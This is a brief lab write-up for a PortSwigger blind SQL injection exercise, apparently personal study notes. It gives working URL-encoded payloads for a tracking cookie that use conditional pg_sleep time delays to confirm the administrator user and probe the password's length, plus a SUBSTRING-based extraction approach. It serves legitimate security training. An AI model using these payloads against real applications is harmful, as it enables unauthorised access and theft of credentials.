

### Lab description 

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.


#### hint

>  You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).


### Solution


- Buzzing with some delay  ( remember to encoding the chars ; and blank space)
![](/static/img/Pasted_image_20230605092523.png)
- Get administrator user
	- `'%3bselect+case+when+(username='administrator')+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--`
![](/static/img/Pasted_image_20230605093143.png)
- Admin password has **19** chars length `'%3bselect+case+when+(username='administrator'+and+length(password)>19)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users--`
- `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
- Lab solved!

![](/static/img/Pasted_image_20230605104517.png)

